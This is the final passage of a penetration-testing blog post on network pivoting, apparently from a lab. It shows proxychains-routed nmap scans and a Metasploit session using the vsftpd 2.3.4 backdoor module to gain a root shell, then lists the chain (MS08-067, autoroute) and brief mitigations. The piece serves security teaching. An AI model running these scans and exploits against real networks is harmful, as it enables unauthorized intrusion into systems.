+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# proxychains nmap <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,22,23,80 8.8.8.9 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-vv</span>
+ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+
+Starting Nmap 7.25BETA1 <span class="o">(</span> https://nmap.org <span class="o">)</span>
+Nmap wishes you a merry Christmas! Specify <span class="nt">-sX</span> <span class="k">for </span>Xmas Scan <span class="o">(</span>https://nmap.org/book/man-port-scanning-techniques.html<span class="o">)</span><span class="nb">.</span>
+NSE: Loaded 36 scripts <span class="k">for </span>scanning.
+Initiating Connect Scan
+Scanning 8.8.8.9 <span class="o">[</span>4 ports]
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:21-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+Discovered open port 21/tcp on 8.8.8.9
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:23-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+Discovered open port 23/tcp on 8.8.8.9
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:22-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+Discovered open port 22/tcp on 8.8.8.9
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:80-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+Discovered open port 80/tcp on 8.8.8.9
+Completed Connect Scan at 05:54, 1.37s elapsed <span class="o">(</span>4 total ports<span class="o">)</span>
+Initiating Service scan at 05:54
+Scanning 4 services on 8.8.8.9
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:21-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:22-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:23-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:80-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+Completed Service scan at 05:54, 11.09s elapsed <span class="o">(</span>4 services on 1 host<span class="o">)</span>
+NSE: Script scanning 8.8.8.9.
+NSE: Starting runlevel 1 <span class="o">(</span>of 2<span class="o">)</span> scan.
+Initiating NSE at 05:54
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:80-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+|D-chain|-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1080-&lt;<span class="o">&gt;</span><span class="nt">-172</span>.16.0.20:1081-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-8</span>.8.8.9:80-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-OK</span>
+Completed NSE at 05:54, 1.71s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 2<span class="o">)</span> scan.
+Initiating NSE at 05:54
+Completed NSE at 05:54, 0.00s elapsed
+Nmap scan report <span class="k">for </span>8.8.8.9
+Host is up, received user-set <span class="o">(</span>0.41s latency<span class="o">)</span><span class="nb">.</span>
+Scanned 
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 2.3.4
+22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+23/tcp open  telnet  syn-ack Linux telnetd
+80/tcp open  http    syn-ack Apache httpd 2.2.8 <span class="o">((</span>Ubuntu<span class="o">)</span> DAV/2<span class="o">)</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.59 seconds
+root@kali:~#
+</code></pre></div></div>
+
+<p>As you can see, the packages goes through the first proxy server, then the second proxy server we have defined. Finally, it reaches its destination.</p>
+
+<p>When the scan result is analyzed, it will be determined that a <a href="https://www.exploit-db.com/exploits/17491/">vulnerable</a> version of the <strong>vsftpd</strong> service is installed on 8.8.8.9.</p>
+
+<p>The following steps are taken to prepare the vsftpd exploit module in the Metasploit Framework and to compromise out final target:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf</span> <span class="o">&gt;</span> 
+
+<span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">ftp</span><span class="o">/</span><span class="n">vsftpd_234_backdoor</span> 
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">vsftpd_234_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span> 
+
+<span class="no">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">ftp</span><span class="o">/</span><span class="n">vsftpd_234_backdoor</span><span class="p">):</span>
+
+   <span class="no">Name</span>   <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>   <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">RHOST</span>                   <span class="n">yes</span>       <span class="no">The</span> <span class="n">target</span> <span class="n">address</span>
+   <span class="no">RPORT</span>  <span class="mi">21</span>               <span class="n">yes</span>       <span class="no">The</span> <span class="n">target</span> <span class="n">port</span>
+
+
+<span class="no">Exploit</span> <span class="ss">target:
+
+   </span><span class="no">Id</span>  <span class="no">Name</span>
+   <span class="o">--</span>  <span class="o">----</span>
+   <span class="mi">0</span>   <span class="no">Automatic</span>
+
+
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">vsftpd_234_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">rhost</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.9</span>
+<span class="n">rhost</span> <span class="o">=&gt;</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.9</span>
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">vsftpd_234_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.9</span><span class="p">:</span><span class="mi">21</span> <span class="o">-</span> <span class="no">Banner</span><span class="p">:</span> <span class="mi">220</span> <span class="p">(</span><span class="n">vsFTPd</span> <span class="mf">2.3</span><span class="o">.</span><span class="mi">4</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.9</span><span class="p">:</span><span class="mi">21</span> <span class="o">-</span> <span class="no">USER</span><span class="p">:</span> <span class="mi">331</span> <span class="no">Please</span> <span class="n">specify</span> <span class="n">the</span> <span class="n">password</span><span class="p">.</span>
+<span class="nf">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.9</span><span class="p">:</span><span class="mi">21</span> <span class="o">-</span> <span class="no">Backdoor</span> <span class="n">service</span> <span class="n">has</span> <span class="n">been</span> <span class="n">spawned</span><span class="p">,</span> <span class="n">handling</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.9</span><span class="p">:</span><span class="mi">21</span> <span class="o">-</span> <span class="no">UID</span><span class="p">:</span> <span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Found</span> <span class="n">shell</span><span class="p">.</span>
+<span class="nf">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Command</span> <span class="n">shell</span> <span class="n">session</span> <span class="mi">4</span> <span class="n">opened</span> <span class="p">(</span><span class="no">Local</span> <span class="no">Pipe</span> <span class="o">-&gt;</span> <span class="no">Remote</span> <span class="no">Pipe</span><span class="p">)</span> 
+
+<span class="n">pwd</span>
+<span class="sr">/
+id
+uid=0(root) gid=0(root)
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  
+          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe56:f17c/</span><span class="mi">64</span> <span class="no">Scope</span><span class="ss">:Link</span>
+          <span class="no">UP</span> <span class="no">BROADCAST</span> <span class="no">RUNNING</span> <span class="no">MULTICAST</span>  <span class="no">MTU</span><span class="p">:</span><span class="mi">1500</span>  <span class="no">Metric</span><span class="p">:</span><span class="mi">1</span>
+          <span class="no">RX</span> <span class="n">packets</span><span class="p">:</span><span class="mi">10843</span> <span class="n">errors</span><span class="p">:</span><span class="mi">0</span> <span class="n">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="n">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="n">frame</span><span class="p">:</span><span class="mi">0</span>
+          <span class="no">TX</span> <span class="n">packets</span><span class="p">:</span><span class="mi">2779</span> <span class="n">errors</span><span class="p">:</span><span class="mi">0</span> <span class="n">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="n">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="n">carrier</span><span class="p">:</span><span class="mi">0</span>
+          <span class="n">collisions</span><span class="p">:</span><span class="mi">0</span> <span class="n">txqueuelen</span><span class="p">:</span><span class="mi">1000</span> 
+          <span class="no">RX</span> <span class="n">bytes</span><span class="p">:</span><span class="mi">1081842</span> <span class="p">(</span><span class="mf">1.0</span> <span class="no">MB</span><span class="p">)</span>  <span class="no">TX</span> <span class="n">bytes</span><span class="p">:</span><span class="mi">661455</span> <span class="p">(</span><span class="mf">645.9</span> <span class="no">KB</span><span class="p">)</span>
+          <span class="no">Base</span> <span class="n">address</span><span class="p">:</span><span class="mh">0xd010</span> <span class="no">Memory</span><span class="ss">:f0000000</span><span class="o">-</span><span class="n">f0020000</span> 
+
+<span class="n">lo</span>        <span class="no">Link</span> <span class="n">encap</span><span class="ss">:Local</span> <span class="no">Loopback</span>  
+          <span class="n">inet</span> <span class="n">addr</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>  <span class="no">Mask</span><span class="p">:</span><span class="mf">255.0</span><span class="o">.</span><span class="mf">0.0</span>
+          <span class="n">inet6</span> <span class="ss">addr: </span><span class="o">::</span><span class="mi">1</span><span class="o">/</span><span class="mi">128</span> <span class="no">Scope</span><span class="ss">:Host</span>
+          <span class="no">UP</span> <span class="no">LOOPBACK</span> <span class="no">RUNNING</span>  <span class="no">MTU</span><span class="p">:</span><span class="mi">16436</span>  <span class="no">Metric</span><span class="p">:</span><span class="mi">1</span>
+          <span class="no">RX</span> <span class="n">packets</span><span class="p">:</span><span class="mi">18161</span> <span class="n">errors</span><span class="p">:</span><span class="mi">0</span> <span class="n">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="n">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="n">frame</span><span class="p">:</span><span class="mi">0</span>
+          <span class="no">TX</span> <span class="n">packets</span><span class="p">:</span><span class="mi">18161</span> <span class="n">errors</span><span class="p">:</span><span class="mi">0</span> <span class="n">dropped</span><span class="p">:</span><span class="mi">0</span> <span class="n">overruns</span><span class="p">:</span><span class="mi">0</span> <span class="n">carrier</span><span class="p">:</span><span class="mi">0</span>
+          <span class="n">collisions</span><span class="p">:</span><span class="mi">0</span> <span class="n">txqueuelen</span><span class="p">:</span><span class="mi">0</span> 
+          <span class="no">RX</span> <span class="n">bytes</span><span class="p">:</span><span class="mi">5307479</span> <span class="p">(</span><span class="mf">5.0</span> <span class="no">MB</span><span class="p">)</span>  <span class="no">TX</span> <span class="n">bytes</span><span class="p">:</span><span class="mi">5307479</span> <span class="p">(</span><span class="mf">5.0</span> <span class="no">MB</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="in-conclusion">In Conclusion</h2>
+
+<p>The attacker discovered 2 different secret networks by following the steps below.</p>
+<ol>
+  <li>Attacked got an access to the RD machine which  was on same network with attacker.</li>
+  <li>And then he realise that RD machine has 2 network interface.</li>
+  <li>He defined an routing rule by using autoroute post module.</li>
+  <li>And then attacker performed  ARP and NMAP scanning on 7.7.7.0/24 network and found machine named as JC.</li>
+  <li>JC had a two different vulnerability. Easy File Share and MS08-067.</li>
+  <li>Successfully exploitation of MS08-067 allowed attacker to gain an access to the 7.7.7.20</li>
+  <li>Information gathering showed JC also have 2 network interface.</li>
+  <li>Another routing rule defined on 7.7.7.20.</li>
+  <li>ARP and NMAP was used on 8.8.8.0/24.</li>
+  <li>Vulnerable vsftp was running on 8.8.8.9 machine named as SK.</li>
+  <li>Final.</li>
+</ol>
+
+<p><img src="/assets/images/blog/12.png" alt="" /></p>
+
+<p>While the attacker’s system could only gain access to the first network he was on, he could also gain access to 2 hidden networks as a result of the attacks.</p>
+
+<h2 id="-and-video-ofcourse">… and Video Ofcourse</h2>
+
+<p>For the people who couldn’t follow this article. We have a video that shows all instructions together 🙂</p>
+
+<p><img src="https://www.youtube.com/watch?v=awLMbwj5iP0" alt="" /></p>
+
+<h2 id="mitigations">Mitigations</h2>
+
+<ul>
+  <li>Systems that contain multiple NICs and provide DMZ access should be removed from the existing network structure.</li>
+  <li>Systems in the DMZ structure should only be accessed over DMZ structures.</li>
+</ul>
+
+<h3 id="references">References</h3>
+<ul>
+  <li><em>http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html</em></li>
+  <li><em>https://www.sans.org/reading-room/whitepapers/testing/post-exploitation-metasploit-pivot-port-33909</em></li>
+  <li><em>https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/</em></li>
+</ul>]]></content><author><name></name></author><category term="network" /><category term="pivoting" /><summary type="html"><![CDATA[Originally posted on pentest[dot]blog by me in 2016.]]></summary></entry></feed>
